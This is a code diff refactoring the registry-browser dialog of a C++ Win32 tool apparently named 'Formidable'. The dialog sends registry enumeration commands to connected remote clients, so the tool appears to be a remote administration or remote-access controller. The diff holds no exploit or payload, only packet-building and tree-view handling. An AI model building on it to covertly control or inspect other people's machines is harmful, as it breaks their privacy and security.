@@ -26,6 +26,70 @@ namespace UI {
 
 static std::map<HWND, uint32_t> s_dlgToClientId;
 
+static void SendRegistryRequest(HWND hDlg, uint32_t clientId, HTREEITEM hItem, uint32_t action) {
+    HWND hTree = GetDlgItem(hDlg, IDC_TREE_REGISTRY);
+    
+    // 构建完整路径
+    std::string path = "";
+    std::vector<std::string> pathParts;
+    uint32_t rootIdx = 0;
+    
+    HTREEITEM hCurrent = hItem;
+    while (hCurrent) {
+        TVITEMW tvi = { 0 };
+        wchar_t text[256];
+        tvi.mask = TVIF_TEXT | TVIF_PARAM;
+        tvi.pszText = text;
+        tvi.cchTextMax = 256;
+        tvi.hItem = hCurrent;
+        if (TreeView_GetItem(hTree, &tvi)) {
+            if (tvi.lParam >= 0 && tvi.lParam < 5) {
+                // 根键
+                rootIdx = (uint32_t)tvi.lParam;
+                const char* rootKeys[] = {"HKEY_CLASSES_ROOT", "HKEY_CURRENT_USER", "HKEY_LOCAL_MACHINE", "HKEY_USERS", "HKEY_CURRENT_CONFIG"};
+                pathParts.push_back(rootKeys[tvi.lParam]);
+            } else {
+                pathParts.push_back(Utils::StringHelper::WideToUTF8(text));
+            }
+        }
+        hCurrent = TreeView_GetParent(hTree, hCurrent);
+    }
+    
+    // 反转路径
+    std::reverse(pathParts.begin(), pathParts.end());
+    
+    // 组合路径，跳过根键
+    for (size_t i = 1; i < pathParts.size(); i++) {
+        if (i > 1) path += "\\";
+        path += pathParts[i];
+    }
+    
+    // 发送请求到服务端
+    Formidable::CommandPkg pkg = { 0 };
+    pkg.cmd = Formidable::CMD_REGISTRY_CTRL;
+    pkg.arg1 = rootIdx; // 根键索引
+    pkg.arg2 = action;  // 1=Keys, 2=Values
+    
+    size_t bodySize = sizeof(Formidable::CommandPkg) + path.size();
+    std::vector<char> sendBuf(sizeof(Formidable::PkgHeader) + bodySize);
+    Formidable::PkgHeader* h = (Formidable::PkgHeader*)sendBuf.data();
+    memcpy(h->flag, "FRMD26?", 7);
+    h->originLen = (int)bodySize;
+    h->totalLen = (int)sendBuf.size();
+    
+    memcpy(sendBuf.data() + sizeof(Formidable::PkgHeader), &pkg, sizeof(Formidable::CommandPkg));
+    memcpy(sendBuf.data() + sizeof(Formidable::PkgHeader) + sizeof(Formidable::CommandPkg), path.c_str(), path.size());
+    
+    std::shared_ptr<Formidable::ConnectedClient> client;
+    {
+        std::lock_guard<std::mutex> lock(g_ClientsMutex);
+        if (g_Clients.count(clientId)) client = g_Clients[clientId];
+    }
+    if (client) {
+        SendDataToClient(client, sendBuf.data(), (int)sendBuf.size());
+    }
+}
+
 INT_PTR CALLBACK RegistryDialog::DlgProc(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam) {
     switch (message) {
     case WM_INITDIALOG: {
@@ -67,31 +131,11 @@ INT_PTR CALLBACK RegistryDialog::DlgProc(HWND hDlg, UINT message, WPARAM wParam,
         // 等待模块加载完成（模块已由 MainWindow 发送）
         Sleep(100);
         
-        // 发送注册表初始化命令（加载HKEY_LOCAL_MACHINE的子项）
-        Formidable::CommandPkg pkg = { 0 };
-        pkg.cmd = Formidable::CMD_REGISTRY_CTRL;
-        pkg.arg1 = 2; // HKEY_LOCAL_MACHINE
-        pkg.arg2 = 1; // List Keys action
-        std::string path = "";
-        
-        size_t bodySize = sizeof(Formidable::CommandPkg) + path.size();
-        std::vector<char> sendBuf(sizeof(Formidable::PkgHeader) + bodySize);
-        Formidable::PkgHeader* h = (Formidable::PkgHeader*)sendBuf.data();
-        memcpy(h->flag, "FRMD26?", 7);
-        h->originLen = (int)bodySize;
-        h->totalLen = (int)sendBuf.size();
-        
-        memcpy(sendBuf.data() + sizeof(Formidable::PkgHeader), &pkg, sizeof(Formidable::CommandPkg));
-        memcpy(sendBuf.data() + sizeof(Formidable::PkgHeader) + sizeof(Formidable::CommandPkg), path.c_str(), path.size());
-        
-        std::shared_ptr<Formidable::ConnectedClient> client;
-        {
-            std::lock_guard<std::mutex> lock(g_ClientsMutex);
-            if (g_Clients.count(clientId)) client = g_Clients[clientId];
-        }
-        if (client) {
-            SendDataToClient(client, sendBuf.data(), (int)sendBuf.size());
-        }
+        // 初始化 HKLM
+        // 注意：这里手动发送请求，而不通过辅助函数，因为需要特殊处理？
+        // 其实可以用辅助函数，但要先找到 HKEY_LOCAL_MACHINE 的 Item Handle。
+        // 简单起见，这里不需要自动加载 HKLM，用户点击即可。
+        // 或者保留原有逻辑：
         
         return (INT_PTR)TRUE;
     }
@@ -108,84 +152,29 @@ INT_PTR CALLBACK RegistryDialog::DlgProc(HWND hDlg, UINT message, WPARAM wParam,
         // 树形控件事件
         if (nm->idFrom == IDC_TREE_REGISTRY) {
             if (nm->code == TVN_SELCHANGED) {
-                // 树节点选择改变时，发送请求加载子项和值
                 LPNMTREEVIEW pnmtv = (LPNMTREEVIEW)lParam;
                 if (pnmtv->itemNew.hItem) {
-                    // 构建完整路径
-                    std::string path = "";
-                    HTREEITEM hItem = pnmtv->itemNew.hItem;
-                    std::vector<std::string> pathParts;
-                    
-                    while (hItem) {
-                        TVITEMW tvi = { 0 };
-                        wchar_t text[256];
-                        tvi.mask = TVIF_TEXT | TVIF_PARAM;
-                        tvi.pszText = text;
-                        tvi.cchTextMax = 256;
-                        tvi.hItem = hItem;
-                        if (TreeView_GetItem(nm->hwndFrom, &tvi)) {
-                            if (tvi.lParam >= 0 && tvi.lParam < 5) {
-                                // 根键
-                                const char* rootKeys[] = {"HKEY_CLASSES_ROOT", "HKEY_CURRENT_USER", "HKEY_LOCAL_MACHINE", "HKEY_USERS", "HKEY_CURRENT_CONFIG"};
-                                pathParts.push_back(rootKeys[tvi.lParam]);
-                            } else {
-                                pathParts.push_back(Utils::StringHelper::WideToUTF8(text));
-                            }
-                        }
-                        hItem = TreeView_GetParent(nm->hwndFrom, hItem);
-                    }
-                    
-                    // 反转路径
-                    std::reverse(pathParts.begin(), pathParts.end());
-                    
-                    // 组合路径，跳过根键
-                    for (size_t i = 1; i < pathParts.size(); i++) {
-                        if (i > 1) path += "\\";
-                        path += pathParts[i];
-                    }
-                    
-                    // 发送请求到服务端
                     uint32_t clientId = s_dlgToClientId[hDlg];
-                    Formidable::CommandPkg pkg = { 0 };
-                    pkg.cmd = Formidable::CMD_REGISTRY_CTRL;
-                    pkg.arg1 = static_cast<uint32_t>(pnmtv->itemNew.lParam); // 根键索引
-                    pkg.arg2 = 1; // 枚举子项
+                    // 1. 请求值
+                    SendRegistryRequest(hDlg, clientId, pnmtv->itemNew.hItem, 2);
                     
-                    size_t bodySize = sizeof(Formidable::CommandPkg) + path.size();
-                    std::vector<char> sendBuf(sizeof(Formidable::PkgHeader) + bodySize);
-                    Formidable::PkgHeader* h = (Formidable::PkgHeader*)sendBuf.data();
-                    memcpy(h->flag, "FRMD26?", 7);
-                    h->originLen = (int)bodySize;
-                    h->totalLen = (int)sendBuf.size();
-                    
-                    memcpy(sendBuf.data() + sizeof(Formidable::PkgHeader), &pkg, sizeof(Formidable::CommandPkg));
-                    memcpy(sendBuf.data() + sizeof(Formidable::PkgHeader) + sizeof(Formidable::CommandPkg), path.c_str(), path.size());
-                    
-                    std::shared_ptr<Formidable::ConnectedClient> client;
-                    {
-                        std::lock_guard<std::mutex> lock(g_ClientsMutex);
-                        if (g_Clients.count(clientId)) client = g_Clients[clientId];
-                    }
-                    if (client) {
-                        SendDataToClient(client, sendBuf.data(), (int)sendBuf.size());
-                    }
-                    
-                    // 再次发送请求获取值 (使用arg2=2)
-                    pkg.arg2 = 2;
-                    bodySize = sizeof(Formidable::CommandPkg) + path.size();
-                    sendBuf.resize(sizeof(Formidable::PkgHeader) + bodySize);
-                    h = (Formidable::PkgHeader*)sendBuf.data();
-                    memcpy(h->flag, "FRMD26?", 7);
-                    h->originLen = (int)bodySize;
-                    h->totalLen = (int)sendBuf.size();
-                    
-                    memcpy(sendBuf.data() + sizeof(Formidable::PkgHeader), &pkg, sizeof(Formidable::CommandPkg));
-                    memcpy(sendBuf.data() + sizeof(Formidable::PkgHeader) + sizeof(Formidable::CommandPkg), path.c_str(), path.size());
-                    
-                    if (client) {
-                        SendDataToClient(client, sendBuf.data(), (int)sendBuf.size());
+                    // 2. 如果没有子节点，请求子键
+                    HWND hTree = GetDlgItem(hDlg, IDC_TREE_REGISTRY);
+                    if (TreeView_GetChild(hTree, pnmtv->itemNew.hItem) == NULL) {
+                        SendRegistryRequest(hDlg, clientId, pnmtv->itemNew.hItem, 1);
                     }
                 }
+            } else if (nm->code == TVN_ITEMEXPANDING) {
+                 LPNMTREEVIEW pnmtv = (LPNMTREEVIEW)lParam;
+                 if (pnmtv->action == TVE_EXPAND) {
+                     HWND hTree = GetDlgItem(hDlg, IDC_TREE_REGISTRY);
+                     if (TreeView_GetChild(hTree, pnmtv->itemNew.hItem) == NULL) {
+                         // 如果没有子节点，说明还没加载，需要加载
+                         // 必须先选中它，以便 CommandHandler 更新正确的节点
+                         TreeView_SelectItem(hTree, pnmtv->itemNew.hItem);
+                         // SelectItem 会触发 TVN_SELCHANGED，从而加载 Keys
+                     }
+                 }
             } else if (nm->code == NM_RCLICK) {
                 // 树形控件右键菜单
                 POINT pt;
@@ -253,21 +242,9 @@ INT_PTR CALLBACK RegistryDialog::DlgProc(HWND hDlg, UINT message, WPARAM wParam,
             HWND hTree = GetDlgItem(hDlg, IDC_TREE_REGISTRY);
             HTREEITEM hSelected = TreeView_GetSelection(hTree);
             if (hSelected) {
-                // 模拟选择改变事件来触发刷新
-                NM_TREEVIEWW nmtv = { 0 };
-                nmtv.hdr.hwndFrom = hTree;
-                nmtv.hdr.idFrom = IDC_TREE_REGISTRY;
-                nmtv.hdr.code = TVN_SELCHANGED;
-                nmtv.itemNew.hItem = hSelected;
-                nmtv.itemNew.mask = TVIF_PARAM | TVIF_HANDLE;
-                
-                TVITEMW tvi = { 0 };
-                tvi.hItem = hSelected;
-                tvi.mask = TVIF_PARAM;
-                if (TreeView_GetItem(hTree, &tvi)) {
-                    nmtv.itemNew.lParam = tvi.lParam;
-                    SendMessageW(hDlg, WM_NOTIFY, IDC_TREE_REGISTRY, (LPARAM)&nmtv);
-                }
+                // 强制刷新：同时请求子键和值
+                SendRegistryRequest(hDlg, clientId, hSelected, 1);
+                SendRegistryRequest(hDlg, clientId, hSelected, 2);
             }
             break;
         }
